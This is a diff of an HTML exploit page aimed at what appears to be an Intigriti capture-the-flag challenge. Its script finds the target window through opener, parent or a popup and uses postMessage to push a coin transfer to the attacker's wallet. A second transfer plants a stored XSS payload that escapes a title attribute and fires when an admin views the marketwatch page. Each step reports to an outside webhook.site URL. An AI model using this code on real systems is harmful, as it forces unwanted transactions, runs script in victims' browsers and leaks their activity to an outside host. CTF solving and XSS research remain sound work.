@@ -3,129 +3,174 @@
 <head>
     <title>XSS Exploit</title>
     <meta charset="UTF-8">
-    <style>
-        body {
-            font-family: 'Courier New', monospace;
-            background: #0a0a0a;
-            color: #00ff00;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            min-height: 100vh;
-            margin: 0;
-            padding: 20px;
-        }
-        h1 { color: #00ff00; text-shadow: 0 0 10px #00ff00; }
-        #log {
-            background: #111;
-            border: 1px solid #333;
-            padding: 15px;
-            max-width: 700px;
-            width: 100%;
-            margin-top: 20px;
-            font-size: 12px;
-            line-height: 1.6;
-        }
-        .success { color: #00ffff; }
-        .error { color: #ff4444; }
-        .info { color: #ffaa00; }
-    </style>
+    <style>body{font-family:monospace;background:#0a0a0a;color:#00ff00;padding:20px;}</style>
 </head>
 <body>
     <h1>EXPLOIT LOADED</h1>
-    <div id="log">Initializing...</div>
+    <div id="log">Initializing exploit...</div>
 
     <script>
         const BASE = 'https://challenge-0126.intigriti.io';
         const WEBHOOK = 'https://webhook.site/f324d507-94fa-4265-8946-2b290873a05e';
         const YOUR_WALLET = '1cc4a7735c998cb4b4e390e97c349281d2';
-        const XSS_PAYLOAD = '<img src=x onerror="alert(\'gigawatz\')">';
 
-        const logDiv = document.getElementById('log');
+        // XSS Payload - breaks out of title attribute in marketwatch
+        // marketwatch.html has: <span title="${tx?.address}">
+        // The address field is unsanitized in the title attribute!
+        const XSS_WALLET = '"><img src=x onerror="alert(\'gigawatz\')">';
 
-        function log(msg, className = '') {
-            const timestamp = new Date().toLocaleTimeString();
-            logDiv.innerHTML += `<span class="${className}">[${timestamp}] ${msg}</span><br>`;
+        function log(msg) {
+            document.getElementById('log').innerHTML += '<br>' + msg;
             console.log(msg);
         }
 
         function track(step, status, data = {}) {
-            const url = `${WEBHOOK}?step=${step}&status=${status}&timestamp=${Date.now()}&data=${encodeURIComponent(JSON.stringify(data))}`;
+            const url = `${WEBHOOK}?step=${step}&status=${status}&ts=${Date.now()}&d=${encodeURIComponent(JSON.stringify(data))}`;
             fetch(url, { mode: 'no-cors' }).catch(() => {});
         }
 
-        async function executeExploit() {
-            log('Starting XSS exploit...', 'info');
-            track('start', 'admin_visited_exploit', { wallet: YOUR_WALLET });
+        track('start', 'exploit_loaded', {});
 
-            const checkoutUrl = `${BASE}/checkout.html?currency=1337COIN&price=1`;
-            log('Opening checkout popup...', 'info');
+        // STRATEGY 1: Use window.opener (if bot opened us in a popup)
+        if (window.opener && !window.opener.closed) {
+            log('Found window.opener - starting exploit...');
+            track('found_opener', 'success', {});
 
-            const popup = window.open(checkoutUrl, 'checkout', 'width=1000,height=800');
+            // Redirect opener to checkout.html first
+            window.opener.location.href = `${BASE}/checkout.html?currency=1337COIN&price=1`;
 
-            if (!popup) {
-                log('ERROR: Popup blocked!', 'error');
-                track('error', 'popup_blocked', {});
-                return;
-            }
-
-            log('Popup opened', 'success');
-            track('popup_opened', 'success', {});
-
-            // Wait for popup to load wallets
+            // Wait for page to load, then send postMessage
             setTimeout(() => {
-                log('Sending transaction with XSS in nickname...', 'info');
+                // Transaction 1: Send coins to your wallet
+                log('Sending TX #1 to ' + YOUR_WALLET + '...');
+                track('tx1_start', 'sending', { to: YOUR_WALLET });
 
-                // Send transaction - API might accept nickname even if checkout.html doesn't send it
-                popup.postMessage({
+                window.opener.postMessage({
                     type: 'submitTransaction',
                     transaction: {
                         toAddress: YOUR_WALLET,
                         currency: '1337COIN',
-                        amount: 1337,
-                        nickname: XSS_PAYLOAD  // Try including it
+                        amount: 1337
                     }
                 }, '*');
 
-                track('tx_sent', 'xss_injected', { payload: XSS_PAYLOAD });
+                track('tx1_sent', 'success', {});
+                log('TX #1 sent!');
 
-                // Also try with XSS in address field
+                // Transaction 2: Send to XSS wallet (breaks out of title attribute)
                 setTimeout(() => {
-                    log('Trying XSS in toAddress field...', 'info');
-                    popup.postMessage({
+                    log('Sending TX #2 with XSS payload...');
+                    track('tx2_start', 'sending', { to: XSS_WALLET });
+
+                    window.opener.postMessage({
                         type: 'submitTransaction',
                         transaction: {
-                            toAddress: XSS_PAYLOAD,
+                            toAddress: XSS_WALLET,
                             currency: '1337COIN',
                             amount: 1337
                         }
                     }, '*');
-                    track('tx2_sent', 'xss_in_address', {});
-                }, 500);
 
-                log('Exploit complete!', 'success');
-                track('complete', 'done', {});
-
+                    track('tx2_sent', 'success', {});
+                    log('TX #2 sent with XSS!');
+                    log('XSS will trigger when admin views marketwatch!');
+                }, 2000);
             }, 5000);
+        }
+        // STRATEGY 2: Use window.parent (if bot opened us in an iframe)
+        else if (window.parent && window.parent !== window) {
+            log('Found window.parent - starting exploit...');
+            track('found_parent', 'success', {});
 
-            // Close popup after delay
+            window.parent.location.href = `${BASE}/checkout.html?currency=1337COIN&price=1`;
+
             setTimeout(() => {
-                if (popup && !popup.closed) {
-                    popup.close();
-                    log('Popup closed', 'info');
-                }
-            }, 8000);
+                log('Sending TX #1 to ' + YOUR_WALLET + '...');
+                track('tx1_start', 'sending', { to: YOUR_WALLET });
+
+                window.parent.postMessage({
+                    type: 'submitTransaction',
+                    transaction: {
+                        toAddress: YOUR_WALLET,
+                        currency: '1337COIN',
+                        amount: 1337
+                    }
+                }, '*');
+
+                track('tx1_sent', 'success', {});
+                log('TX #1 sent!');
+
+                setTimeout(() => {
+                    log('Sending TX #2 with XSS payload...');
+                    track('tx2_start', 'sending', { to: XSS_WALLET });
+
+                    window.parent.postMessage({
+                        type: 'submitTransaction',
+                        transaction: {
+                            toAddress: XSS_WALLET,
+                            currency: '1337COIN',
+                            amount: 1337
+                        }
+                    }, '*');
+
+                    track('tx2_sent', 'success', {});
+                    log('TX #2 sent with XSS!');
+                    log('XSS will trigger when admin views marketwatch!');
+                }, 2000);
+            }, 5000);
+        }
+        // STRATEGY 3: Try to open popup (fallback - will likely be blocked)
+        else {
+            log('No opener or parent found, trying popup...');
+            track('trying_popup', 'attempting', {});
+
+            const popup = window.open(`${BASE}/checkout.html?currency=1337COIN&price=1`, 'checkout', 'width=1000,height=800');
+
+            if (popup) {
+                log('Popup opened! Sending transactions...');
+                track('popup_opened', 'success', {});
+
+                setTimeout(() => {
+                    log('Sending TX #1 to ' + YOUR_WALLET + '...');
+                    track('tx1_start', 'sending', { to: YOUR_WALLET });
+
+                    popup.postMessage({
+                        type: 'submitTransaction',
+                        transaction: {
+                            toAddress: YOUR_WALLET,
+                            currency: '1337COIN',
+                            amount: 1337
+                        }
+                    }, '*');
+
+                    track('tx1_sent', 'success', {});
+                    log('TX #1 sent!');
+
+                    setTimeout(() => {
+                        log('Sending TX #2 with XSS payload...');
+                        track('tx2_start', 'sending', { to: XSS_WALLET });
+
+                        popup.postMessage({
+                            type: 'submitTransaction',
+                            transaction: {
+                                toAddress: XSS_WALLET,
+                                currency: '1337COIN',
+                                amount: 1337
+                            }
+                        }, '*');
+
+                        track('tx2_sent', 'success', {});
+                        log('TX #2 sent with XSS!');
+                        log('XSS will trigger when admin views marketwatch!');
+                    }, 2000);
+                }, 5000);
+            } else {
+                log('Popup blocked - exploit failed!');
+                track('popup_blocked', 'failed', {});
+            }
         }
 
-        window.addEventListener('message', (event) => {
-            log('Message: ' + JSON.stringify(event.data), 'info');
-            track('popup_message', 'received', { data: event.data });
-        });
-
-        window.addEventListener('load', () => {
-            setTimeout(executeExploit, 500);
-        });
+        track('complete', 'exploit_attempted', {});
     </script>
 </body>
 </html>
